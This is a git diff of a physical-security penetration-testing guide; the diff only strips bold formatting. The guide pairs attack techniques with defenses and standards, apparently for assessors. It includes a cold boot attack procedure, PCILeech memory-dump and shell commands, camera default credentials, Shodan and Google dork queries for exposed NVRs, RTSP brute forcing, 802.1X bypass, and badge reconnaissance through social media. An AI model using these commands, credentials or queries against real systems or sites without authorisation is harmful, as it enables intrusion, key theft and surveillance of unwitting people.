 - Remote HID injection: connect to phone, type payload wirelessly
 - Keylogging capability in newer versions
 - Detectable only by x-ray or advanced cable analysis
 
-**Defenses against USB attacks**:
+Defenses against USB attacks:
 - USB port blocking via endpoint DLP (CrowdStrike Falcon, Carbon Black, etc.)
 - Physical USB port locks (blockers)
 - Group Policy: disable USB storage while allowing HID (partially mitigates)
@@ -785,14 +785,14 @@ ENTER
 
 ### Network Jack Hijacking
 
-**Finding target jacks**:
+Finding target jacks:
 - Conference rooms (often live jacks, frequently unmonitored)
 - Reception areas
 - Hallway jacks near network closets
 - Under desks in temporarily unoccupied areas
 - Common areas (break rooms, lobbies)
 
-**802.1X bypass techniques**:
+802.1X bypass techniques:
 
 *MAC address cloning* (if no 802.1X):
 ```bash
@@ -822,7 +822,7 @@ dhclient eth0
 
 When assessing a server room or data center, evaluate each control:
 
-**Access Controls**:
+Access Controls:
 - Door type: solid core steel door (hollow metal minimum), no exposed hinges, no windows
 - Lock: electronic cipher lock + badge reader (dual-factor at minimum for critical facilities)
 - Mantrap/airlock: dual-door vestibule with single-occupancy enforcement and anti-passback
@@ -830,13 +830,13 @@ When assessing a server room or data center, evaluate each control:
 - Visitor escort policy: no unescorted access, even for authorized technical staff
 - Camera coverage: CCTV on entry points and all server rows, 90-day retention minimum
 
-**Physical Barriers**:
+Physical Barriers:
 - Server cabinet locks (individual rack locks, not just room lock)
 - Cage systems for multi-tenant facilities (welded wire, padlocked cage gates)
 - Raised floor tile security (tiles screwed down or locked in critical areas)
 - Cable management: no accessible cable runs outside secured area
 
-**Monitoring**:
+Monitoring:
 - Out-of-band management (IPMI/iDRAC/iLO) on separate management VLAN
 - Door contact alarms on every entry point with UPS battery backup
 - Motion sensors inside room (supplement to camera)
@@ -845,23 +845,23 @@ When assessing a server room or data center, evaluate each control:
 ### Server Hardware Attacks
 
 #### Cold Boot Attack
-**Threat**: DRAM retains data for seconds to minutes after power loss (longer at low temperature)
+Threat: DRAM retains data for seconds to minutes after power loss (longer at low temperature)
 
-**Attack procedure**:
+Attack procedure:
 1. Apply freeze spray or liquid nitrogen to RAM modules
 2. Power down target (locked) workstation
 3. Physically remove RAM modules
 4. Boot attacker system or insert RAM into tool system
 5. Read RAM contents: encryption keys (BitLocker, FileVault, LUKS), session tokens, passwords
 
-**Key risk**: Full disk encryption keys (BitLocker, LUKS) stored in RAM are recoverable
-**Defense**: TPM with PIN (key not released without correct PIN even on warm boot), memory encryption (AMD SME/SEV, Intel TME)
+Key risk: Full disk encryption keys (BitLocker, LUKS) stored in RAM are recoverable
+Defense: TPM with PIN (key not released without correct PIN even on warm boot), memory encryption (AMD SME/SEV, Intel TME)
 
 #### DMA Attacks via Thunderbolt / FireWire
-**Threat**: PCIe-based interfaces have direct memory access — they can read/write arbitrary RAM
+Threat: PCIe-based interfaces have direct memory access — they can read/write arbitrary RAM
 
-**Tools**:
-- **PCILeech**: Open-source DMA attack framework
+Tools:
+- PCILeech: Open-source DMA attack framework
   ```bash
   # Read target memory (FPGA-based device connected via Thunderbolt)
   pcileech.exe dump -out memory.bin -device FPGA
@@ -873,20 +873,20 @@ When assessing a server room or data center, evaluate each control:
   pcileech.exe wx64_pscmd -device FPGA
   ```
 
-**Defenses**:
-- **Kernel DMA Protection** (Windows 10 1803+): blocks DMA before OS boots; requires IOMMU
-- **Thunderbolt Security Level**: set to "User" or "Secure Connect" in BIOS/UEFI
-- **IOMMU**: Enable VT-d (Intel) or AMD-Vi in BIOS; prevents unauthorized DMA
-- **No Thunderbolt in high-security environments**: disable Thunderbolt entirely in BIOS
+Defenses:
+- Kernel DMA Protection (Windows 10 1803+): blocks DMA before OS boots; requires IOMMU
+- Thunderbolt Security Level: set to "User" or "Secure Connect" in BIOS/UEFI
+- IOMMU: Enable VT-d (Intel) or AMD-Vi in BIOS; prevents unauthorized DMA
+- No Thunderbolt in high-security environments: disable Thunderbolt entirely in BIOS
 
 #### BIOS / UEFI Attacks
-**Threats**:
+Threats:
 - Boot from USB: bypass OS authentication, mount drives, extract data
 - BIOS settings modification: disable Secure Boot, enable legacy boot, disable TPM
 - BIOS implants: persistent firmware-level malware (e.g., CosmicStrand, MoonBounce APT implants)
 - BIOS password extraction via CMOS reset (battery removal or jumper)
 
-**Defenses**:
+Defenses:
 - Strong BIOS password (alphanumeric, not "password1")
 - Secure Boot enabled with custom Platform Key (PK) for high-security environments
 - Full disk encryption with TPM + PIN (prevents cold boot of drive)
@@ -894,9 +894,9 @@ When assessing a server room or data center, evaluate each control:
 - BIOS integrity monitoring (Intel Boot Guard, AMD Platform Secure Boot)
 
 #### TPM Bypass Techniques
-- **TPM sniffing**: LPC/SPI bus sniffing with logic analyzer captures PCR values and keys
-- **Bitpixie attack** (CVE-2023-21563): PXE boot attack against BitLocker on TPM-only (no PIN) systems
-- **Defense**: TPM + PIN (network unlock exempt) eliminates most practical TPM bypass attacks
+- TPM sniffing: LPC/SPI bus sniffing with logic analyzer captures PCR values and keys
+- Bitpixie attack (CVE-2023-21563): PXE boot attack against BitLocker on TPM-only (no PIN) systems
+- Defense: TPM + PIN (network unlock exempt) eliminates most practical TPM bypass attacks
 
 ---
 
@@ -916,7 +916,7 @@ Most IP cameras ship with default credentials that are rarely changed:
 | Vivotek | root / (blank) |
 | Reolink | admin / (blank) |
 
-**Finding exposed cameras on Shodan**:
+Finding exposed cameras on Shodan:
 ```
 # Hikvision cameras with screenshots
 product:"HIKVISION" has_screenshot:true
@@ -956,24 +956,24 @@ nmap -p 554 --script rtsp-url-brute target-ip
 - Hikvision backdoor (CVE-2021-36260): unauthenticated RCE via HTTP
 - Dahua backdoor: authentication bypass CVE-2021-33044
 - NUUO NVR: multiple CVEs including CVE-2018-1149 (stack overflow)
-- **Shodan regularly shows 100,000+ exposed DVR/NVR units**
+- Shodan regularly shows 100,000+ exposed DVR/NVR units
 
 #### Physical Camera Tampering
-- **Spray paint / tape**: cheap, effective; must be reversed by physical access
-- **Infrared LED array**: floods camera IR sensor; effective at night (camera goes white)
-- **Laser pointer**: can permanently damage CCD sensor; creates legal risk for attacker
-- **Physical misdirection**: turn camera to face wall or ceiling
+- Spray paint / tape: cheap, effective; must be reversed by physical access
+- Infrared LED array: floods camera IR sensor; effective at night (camera goes white)
+- Laser pointer: can permanently damage CCD sensor; creates legal risk for attacker
+- Physical misdirection: turn camera to face wall or ceiling
 
 ### Surveillance Defense Best Practices
 
-1. **Credentials**: Change all defaults; use unique strong passwords per device
-2. **Network segmentation**: VLAN cameras off from production network; no internet access without firewall
-3. **Firmware updates**: Apply patches — many critical CVEs exist in unpatched camera firmware
-4. **Encrypted streams**: Use HTTPS for management, SRTP for video streams where supported
-5. **Physical protection**: Vandal-resistant housings (IK10 rated), tamper detection alerts
-6. **Placement**: Cameras should be placed to avoid blind spots; overlap coverage
-7. **Retention**: Minimum 30 days for standard areas; 90+ days for high-security areas
-8. **Monitoring**: Recorded-only surveillance misses real-time events; consider live monitoring or VMS analytics
+1. Credentials: Change all defaults; use unique strong passwords per device
+2. Network segmentation: VLAN cameras off from production network; no internet access without firewall
+3. Firmware updates: Apply patches: many critical CVEs exist in unpatched camera firmware
+4. Encrypted streams: Use HTTPS for management, SRTP for video streams where supported
+5. Physical protection: Vandal-resistant housings (IK10 rated), tamper detection alerts
+6. Placement: Cameras should be placed to avoid blind spots; overlap coverage
+7. Retention: Minimum 30 days for standard areas; 90+ days for high-security areas
+8. Monitoring: Recorded-only surveillance misses real-time events; consider live monitoring or VMS analytics
 
 ---
 
@@ -997,13 +997,13 @@ nmap -p 554 --script rtsp-url-brute target-ip
 ### Badge Intelligence from Social Media
 
 Photos posted to social media often reveal:
-- Badge design (color, layout, logo placement) — sufficient for a convincing fake
+- Badge design (color, layout, logo placement): sufficient for a convincing fake
 - Access level indicators (color-coded zones visible on badge)
 - Lanyard design (some companies use specific branded lanyards)
-- Facility interior — security desk placement, turnstile type, camera positions
-- Employee faces — useful for building a convincing identity
+- Facility interior: security desk placement, turnstile type, camera positions
+- Employee faces: useful for building a convincing identity
 
-**Search methodology**:
+Search methodology:
 ```
 LinkedIn: Search company name → Employees → Filter by department → View profiles with photos
 Instagram: Search company geotag or hashtag
@@ -1013,7 +1013,7 @@ Facebook: company page photos, employee check-ins
 
 ### Technical OSINT
 
-**Job postings as security intelligence**:
+Job postings as security intelligence:
 ```
 "Experience with Lenel OnGuard required" → Physical access system: Lenel OnGuard
 "Manage HID door controllers" → Access card system: HID
@@ -1024,7 +1024,7 @@ Facebook: company page photos, employee check-ins
 
 This tells you exactly which physical security systems to research for vulnerabilities before the engagement.
 
-**Google Dorks for physical security intelligence**:
+Google Dorks for physical security intelligence:
 ```
 # Exposed NVR login pages
 intitle:"Network Video Recorder" inurl:login
@@ -1114,7 +1114,7 @@ ENVIRONMENTAL CONTROLS
 
 ## 12. Physical Security Standards & Frameworks
 
-### NIST SP 800-53 Rev 5 — PE Controls (Physical and Environmental Protection)
+### NIST SP 800-53 Rev 5: PE Controls (Physical and Environmental Protection)
 
 | Control | Name | Key Requirement |
 |---|---|---|
@@ -1124,7 +1124,7 @@ ENVIRONMENTAL CONTROLS
 | PE-4 | Access Control for Transmission | Protect network access points physically |
 | PE-5 | Access Control for Output Devices | Control physical access to printers, fax, copiers |
 | PE-6 | Monitoring Physical Access | Monitor physical access with cameras/guards; review incidents |
-| PE-7 | Visitor Control | **Withdrawn in Rev 5** (merged into PE-3) |
+| PE-7 | Visitor Control | Withdrawn in Rev 5 (merged into PE-3) |
 | PE-8 | Visitor Access Records | Maintain visitor log 2+ years |
 | PE-9 | Power Equipment and Cabling | Protect power feeds, UPS, emergency shutoffs |
 | PE-10 | Emergency Shutoff | Emergency power shutoff per room, protection from accidental use |
@@ -1142,7 +1142,7 @@ ENVIRONMENTAL CONTROLS
 | PE-22 | Component Marking | Mark information system components per classification |
 | PE-23 | Facility Location | Threat and risk analysis for facility location |
 
-### ISO 27001:2022 Annex A.7 — Physical Controls
+### ISO 27001:2022 Annex A.7: Physical Controls
 
 | Control | Description |
 |---|---|
@@ -1161,22 +1161,22 @@ ENVIRONMENTAL CONTROLS
 | A.7.13 | Equipment maintenance |
 | A.7.14 | Secure disposal or re-use of equipment |
 
-### PCI DSS v4.0 Requirement 9 — Restrict Physical Access
+### PCI DSS v4.0 Requirement 9: Restrict Physical Access
 
-**Requirement 9.1**: Processes and mechanisms for restricting physical access to cardholder data are defined and understood.
+Requirement 9.1: Processes and mechanisms for restricting physical access to cardholder data are defined and understood.
 
-**Requirement 9.2**: Physical access controls manage entry into facilities and systems containing cardholder data:
+Requirement 9.2: Physical access controls manage entry into facilities and systems containing cardholder data:
 - 9.2.1: Appropriate facility entry controls
 - 9.2.2: Individual physical access authorization reviewed at least every 90 days
 
-**Requirement 9.3**: Physical access for personnel and visitors is authorized and managed:
+Requirement 9.3: Physical access for personnel and visitors is authorized and managed:
 - 9.3.1: Procedures for authorizing and managing physical access for all personnel
 - 9.3.2: Visitor authorization and management (sign in, badge issued, escorted, badge returned)
 - 9.3.3: Visitor logs retained for minimum 3 months
 
-**Requirement 9.4**: Media with cardholder data is securely stored, accessed, distributed, and destroyed.
+Requirement 9.4: Media with cardholder data is securely stored, accessed, distributed, and destroyed.
 
-**Requirement 9.5**: Point of interaction (POI) devices are protected from tampering and substitution:
+Requirement 9.5: Point of interaction (POI) devices are protected from tampering and substitution:
 - 9.5.1: POI device surface inspection for tampering
 - 9.5.1.1: Periodic inspections of POI devices for unauthorized changes
 - 9.5.1.2: Training for personnel to be aware of POI tampering and skimming
@@ -1198,21 +1198,21 @@ ENVIRONMENTAL CONTROLS
 
 ### Additional Standards
 
-**NERC CIP-006** (Critical Infrastructure Protection — Physical Security of BES Cyber Systems):
+NERC CIP-006 (Critical Infrastructure Protection — Physical Security of BES Cyber Systems):
 - Applicable to electric utilities
 - Requires Physical Security Plan, Physical Security Perimeter (PSP) definition
 - 6-year retention of physical access logs
 - Mandatory visitor escort, control of inbound/outbound cabling
 
-**ASIS International Physical Security Professional (PSP)**:
+ASIS International Physical Security Professional (PSP):
 - Certification covering: Threat Assessment and Risk Analysis, Physical Security Assessment, Application of Physical Security Measures
 - Body of knowledge includes: security surveys, crime prevention through environmental design (CPTED), access control systems, intrusion detection, video surveillance
 
-**CPTED (Crime Prevention Through Environmental Design)**:
-- **Natural surveillance**: design buildings and spaces to increase visibility (openness, lighting)
-- **Natural access control**: guide people through spaces with landscaping, walkways, fencing
-- **Territorial reinforcement**: design that clearly delineates public vs private space
-- **Maintenance**: well-maintained environments reduce criminal opportunity (broken windows theory)
+CPTED (Crime Prevention Through Environmental Design):
+- Natural surveillance: design buildings and spaces to increase visibility (openness, lighting)
+- Natural access control: guide people through spaces with landscaping, walkways, fencing
+- Territorial reinforcement: design that clearly delineates public vs private space
+- Maintenance: well-maintained environments reduce criminal opportunity (broken windows theory)
 - Key standard: IQ Standard 1.0 (CPTED principles)
 
 ---
